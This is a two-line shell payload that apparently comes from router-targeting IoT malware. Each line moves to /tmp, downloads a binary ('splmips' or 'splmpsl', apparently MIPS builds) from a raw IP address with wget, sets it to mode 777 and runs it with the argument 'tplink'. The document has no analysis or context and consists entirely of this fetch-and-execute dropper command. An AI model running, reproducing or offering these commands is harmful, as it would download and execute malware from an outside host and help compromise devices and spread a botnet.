cd /tmp;rm -rf splmips;wget http://45.95.146.126/splmips;chmod 777 splmips;./splmips tplink
cd /tmp;rm -rf splmpsl;wget http://45.95.146.126/splmpsl;chmod 777 splmpsl;./splmpsl tplink